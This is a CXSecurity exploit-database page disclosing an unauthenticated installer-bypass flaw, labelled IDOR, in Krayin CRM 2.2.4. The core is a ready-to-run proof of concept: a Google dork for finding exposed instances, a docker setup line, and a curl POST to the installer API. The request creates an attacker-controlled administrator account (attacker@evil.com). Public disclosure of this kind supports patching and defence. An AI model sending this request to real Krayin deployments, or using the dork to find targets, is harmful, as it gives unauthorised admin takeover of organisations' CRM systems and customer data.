---
title: Krayin CRM 2.2.4 IDOR
url: https://cxsecurity.com/issue/WLB-2026110005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-11-11
fetch_date: 2026-11-12T09:00:46.194134
---

# Krayin CRM 2.2.4 IDOR

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Krayin CRM 2.2.4 IDOR** **2026.11.11**  Credit:  **[bl4dsc4n](https://cxsecurity.com/author/bl4dsc4n/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-100885](https://cxsecurity.com/cveshow/CVE-2026-100885/ "Click to see CVE-2026-100885")**  CWE: **N/A**  **[**Dork:** inurl:"/admin/login" "Krayin"](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Krayin CRM 2.2.4 - IDOR
# Google Dork: inurl:"/admin/login" "Krayin"
# Date: 27/09/2026
# Exploit Author: bl4dsc4n
# Vendor Homepage: https://github.com/krayin/laravel-crm
# Software Link: https://github.com/krayin/laravel-crm/archive/refs/tags/v2.2.4.zip
# Version: ≤ 2.2.4
# Tested on: docker + Ubuntu 24.04.4 LTS
# CVE : CVE-2026-100885
# PoC https://github.com/carlosalbertotuma/advisory/blob/main/advisory-07-Unauthenticated-InstallerBypass.md
#
# docker run -d -p 8888:80 --name Krayin.2.2.4 bladscan/krayin:2.2.4
#
curl -i -X POST "http://TARGET:8888/install/api/admin-config-setup" \
-H "X-Requested-With: XMLHttpRequest" \
--data-urlencode "admin=PwnedAdmin" \
--data-urlencode "email=attacker@evil.com" \
--data-urlencode "password=Pwned12345"

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026110005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top